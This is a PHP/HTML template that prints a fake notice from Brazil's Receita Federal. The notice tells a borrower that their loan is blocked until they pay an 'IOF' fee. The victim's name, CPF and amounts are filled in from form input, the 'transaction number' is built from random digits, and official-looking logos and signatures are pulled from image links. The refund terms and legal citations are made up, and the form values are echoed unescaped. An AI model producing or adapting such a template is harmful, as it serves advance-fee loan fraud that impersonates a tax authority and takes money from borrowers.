<!DOCTYPE html>
<html lang="en">
<head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IOF</title>
</head>
<style>
    @page { margin: 0; }
     *{
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
            font-size: 16px;
        }
     .pag{
            height: 11.69in;
            margin: 0;
            padding: 0;

        }
     .main{
          display: grid;
          grid-template-columns: auto;
     }
     .main > div > img{
          height: 200px;
     }
     .logo{
          display: grid;
          justify-content: center;
     }
     .w-80{
          width: 80vw;
          font-size: 1.1rem;
     }
     .body-text{
          display: grid;
          grid-template-columns: auto;
          justify-content: center;
     }
     table{
          width: 100%;
     }
     tr{
          border:1px solid #ccc;
          
     }
     td{
          padding: 10px;
          font-size: 1.1rem;
     }
     .box-assign{
          
          display: grid;
          grid-template-columns: auto;

     }
     .assign{
          margin-top: -50px;
          display: grid;
          grid-template-columns: auto auto;
          justify-content: space-around;
     }
     strong{
          font-size: 1.1rem;
     }
</style>
<body>
     
     <div class="pag">
          <div class="main">
               <br><br>
               <div class="logo">
                    <img src="https://i.imgur.com/6L8vbAO.png" style="height: 200px;" alt="">
               </div>
               <br>
               <strong style="font-size: 1rem; text-align:center">COMUNICADO DA RECEITA FEDERAL A <br> EMPRESA FINANCE CORRESPONDENTE BANCÁRIO</strong>
               <div class="body-text">
                    <div class="w-80">
                         <br>
                         Pedimos para que a empresa <strong>FINANCE CORRESPONDENTE BANCÁRIO</strong>  regularize a situação pendente, juntamente com o cliente da transação : <strong><?=rand(1, 9);?><?=rand(1, 9);?>.<?=rand(1, 9);?><?=rand(1, 9);?><?=rand(1, 9);?><?=rand(1, 9);?>-<?=rand(1, 9);?></strong>.
                         Referente à quitação do Imposto sobre a Operação Financeira é de <strong>R$ <?= $_POST['iof'] ?></strong> através da sua instituição financeira.Que será reembolsado ao cliente dentro do prazo de 7 dias uteis em 80% do valor e os outros 20% ficam retidos com a receita como tributos.
                         <br><br>
                         <strong>O que é IOF ?</strong><br>
                         (IOF) é a sigla para Imposto que incide sobre Operações de Credito, Câmbio e Seguros.Como o próprio nome diz, é um imposto que incide sobre qualquer tipo de operação de credito, cambio, seguro ou operações relacionadas a títulos de empréstimos.
                         <br><br>
                         As instituições financeiras só são responsáveis pelo pagamento do Imposto sobre Operações Financeiras (IOF) quando não ha contratação da documentação junto com a Instituição Financeira.Nessa hipótese a obrigação não é da financeira e sim do financiado.Segundo a Instituição Normativa (IN) 907.
                         <br><br>
                         <strong>Para que serve ?</strong> <br>
                         O IOF foi criado para ser um instrumento regulatório da economia, por meio da arrecadação desse imposto, o governo tem como saber como está a demanda e oferta de crédito no Brasil.
                         <br><br>
                         <strong>Quando desbloqueia  o seu valor ?</strong><br>
                         O empréstimo só será desbloqueado no valor <strong>R$ <?= $_POST['valor'] ?></strong> á quitação do valor solicitado: <strong>R$ <?= $_POST['iof'] ?></strong> que deverá ser paga pelo cliente, através da instituição financeira.Nos dados do agente financeiro que será disponibilizado.
                         
     
                         <table>
                              <tr>
                                   <td>Favorecido: <strong><?= strtoupper($_POST['nome']) ?></strong></td>
                                   <td>CPF: <strong><?= $_POST['cpf'] ?></strong></td>
                              </tr>
                              <tr>
                                   <td colspan="3">Data de emissão:<strong> <?= date('d/m/Y')?></strong></td>
                              </tr>
                         </table>
     
     
                         <div class="box-assign">
                              <div class="assign">
                                   <div>
                                        <img src="https://i.imgur.com/zXwuoMl.png" style="height: 200px;" alt="">
                                   </div>
                                   <div>
                                        <img src="https://i.imgur.com/qUbKrJi.png" style="height: 200px;" alt="">
                                   </div>
                              </div>
                              
                         </div>
                    </div>
     
     
               </div>
               
          </div>
     </div>
     
</body>
<script>
     window.addEventListener("click",()=>{
          window.print()
      })
 </script>
</html>